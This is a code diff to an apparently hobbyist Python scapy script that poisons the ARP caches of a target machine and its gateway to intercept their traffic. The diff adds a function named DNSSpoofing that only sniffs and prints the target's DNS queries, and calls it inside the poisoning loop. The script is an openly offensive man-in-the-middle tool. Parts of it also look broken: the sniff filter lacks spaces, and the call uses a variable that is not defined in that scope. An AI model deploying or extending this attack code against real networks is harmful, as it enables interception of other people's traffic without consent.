@@ -1,5 +1,5 @@
 from scapy.layers.l2 import *
-from scapy.sendrecv import send
+from scapy.sendrecv import send, sniff
 
 def spoofarpcache(targetip, targetmac, sourceip):
 	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
@@ -29,6 +29,7 @@ def SingleSniffing(targetip, passerelleip):
 			while True:
 				spoofarpcache(targetip, targetmac, gatewayip)
 				spoofarpcache(gatewayip, gatewaymac, targetip)
+				DNSSpoofing(iptarget)
 		except KeyboardInterrupt:
 			print("ARP spoofing stopped")
 			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
@@ -44,6 +45,8 @@ if input("Multiple or Single ? [M or S]") != "M":
 else : 
     ippasserelle = input("Which ip passerelle :")
     MultiSniffing(ippasserelle)
-    
-    
+
+def DNSSpoofing(iptarget):
+   a = sniff(filter="host"+iptarget+"and dns")
+   a.nsummary()
 
